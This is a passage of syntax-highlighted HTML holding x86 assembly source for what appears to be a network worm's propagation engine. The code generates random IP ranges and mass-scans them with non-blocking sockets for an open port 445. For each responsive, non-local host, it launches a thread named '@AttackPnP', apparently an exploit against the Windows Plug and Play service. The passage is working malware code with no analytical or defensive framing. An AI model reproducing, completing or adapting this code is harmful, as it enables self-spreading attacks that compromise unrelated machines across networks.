                </span><span class="sc5">LOCAL_DATA_SIZE</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc2">0x18</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0x10</span><span class="sc4">)</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@randinit</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@Net_loop</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">IP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">@sock_arr</span><span class="sc0">

</span><span class="sc5">@Net_loop</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc5">IP_4</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc5">_445OPEN</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">jnle</span><span class="sc0"> </span><span class="sc5">.c</span><span class="sc0">
</span><span class="sc5">.r</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@GetRandomNet</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">IP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">@sock_arr</span><span class="sc0">
</span><span class="sc5">.c</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc5">IP_3</span><span class="sc0">       </span><span class="sc1">; inc class C net</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@sock_arr</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc5">IP_2</span><span class="sc0">       </span><span class="sc1">; inc class B</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">.r</span><span class="sc0">

</span><span class="sc5">@sock_arr</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">64</span><span class="sc0">

</span><span class="sc5">@sock_loop</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc5">IP_4</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc5">IP_4</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xFF</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@Select</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">            </span><span class="sc1">; counter</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">socket</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">            </span><span class="sc1">; ecx = TRUE</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">FIONBIO</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ioctlsocket</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc2">0x10</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SIN</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">connect</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@sleep</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">        </span><span class="sc1">;save sockets on stack</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">@sock_loop</span><span class="sc0">

</span><span class="sc5">@Select</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">64</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@end_loop</span><span class="sc0">        </span><span class="sc1">; (&lt;- should never happen)</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">        </span><span class="sc1">; socket array</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">_445OPEN</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc5">.fd_set</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; fd_array</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@sleep</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">.fd_set</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_445OPEN</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">        </span><span class="sc1">; fd_count</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">        </span><span class="sc1">; CloseSockArr (sock count &lt;= 64)</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">        </span><span class="sc1">; CloseSockArr (pointer to socket array)</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">        </span><span class="sc1">; tv { 0,0 } poll</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">        </span><span class="sc1">; exceptfds</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">        </span><span class="sc1">; writefds</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">        </span><span class="sc1">; readfds</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc5">TIMEOUT</span><span class="sc0">  </span><span class="sc1">; 5 sec.</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Sleep</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">select</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">_445OPEN</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jle</span><span class="sc0"> </span><span class="sc5">@select_end</span><span class="sc0">     </span><span class="sc1">; 0 | -1</span><span class="sc0">

    </span><span class="sc6">lodsd</span><span class="sc0">           </span><span class="sc1">; fd_count</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">.open_loop</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">           </span><span class="sc1">; fd_array</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@PortOpen</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@sleep</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">.open_loop</span><span class="sc0">

</span><span class="sc5">@select_end</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@CloseSockArr</span><span class="sc0">      </span><span class="sc1">; ebx, edx</span><span class="sc0">
</span><span class="sc5">@end_loop</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">LOCAL_DATA_SIZE</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CONNECTED</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">.Exit_Scan</span><span class="sc0">           </span><span class="sc1">; disconnected</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OSVERSION</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jns</span><span class="sc0"> </span><span class="sc2">.2</span><span class="sc0">

    </span><span class="sc1">;only for Win9x</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc5">_445OPEN</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

    </span><span class="sc6">jle</span><span class="sc0"> </span><span class="sc2">.40</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc2">.240</span><span class="sc0">

</span><span class="sc2">.40</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">40</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">1000</span><span class="sc0">        </span><span class="sc1">;40 sec.</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">.sleep</span><span class="sc0">
</span><span class="sc2">.240</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">240</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">1000</span><span class="sc0">       </span><span class="sc1">;4 min. (TIME_WAIT delay)</span><span class="sc0">

</span><span class="sc5">.sleep</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Sleep</span><span class="sc0">

</span><span class="sc2">.2</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc5">IP_4</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xFF</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">@Net_loop</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@sock_arr</span><span class="sc0">

</span><span class="sc5">.Exit_Scan</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ExitThread</span><span class="sc0">



</span><span class="sc5">@randinit</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetCurrentThreadId</span><span class="sc0">
    </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
    </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetTickCount</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">RAND_SEED</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">@sleep</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">CS_LOOP</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">EnterCriticalSection</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Sleep</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">CS_LOOP</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">LeaveCriticalSection</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">@CloseSockArr</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; socket array</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; count</span><span class="sc0">

</span><span class="sc5">.close_loop</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">closesocket</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@sleep</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">.close_loop</span><span class="sc0">

    </span><span class="sc6">ret</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">


</span><span class="sc5">@PortOpen</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc1">; eax: socket</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc2">0x10</span><span class="sc0">  </span><span class="sc1">; 0x10 bytes stack frame</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc2">0x10</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">        </span><span class="sc1">; len</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">        </span><span class="sc1">; sockaddr</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">getpeername</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">.end</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">dwLocalIPs</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">lpLocalIPs</span><span class="sc0">
    </span><span class="sc6">repne</span><span class="sc0"> </span><span class="sc6">scasd</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">.end</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">    </span><span class="sc1">;lpThreadId</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">    </span><span class="sc1">;dwCreationFlags</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">;lpParameter (IP)</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">@AttackPnP</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">STACK_SIZE</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CreateThread</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0">

</span><span class="sc5">.end</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@WaitMaxThreads</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc2">0x8</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">@rand</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">RAND_SEED</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
 </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">    </span><span class="sc1">; rotate left, bits shifted out reenter on the right</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetTickCount</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
 </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
 </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">;add some big number</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
 </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">RAND_SEED</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; store random seed</span><span class="sc0">

 </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">       </span><span class="sc1">; zero edx for edx:eax MOD ecx</span><span class="sc0">
 </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">        </span><span class="sc1">; divide by ecx, remainder in edx</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

 </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;RETURN:    ebx</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">@GetRandomNet</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc5">.rnd</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">256</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@rand</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">imul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">.rnd</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
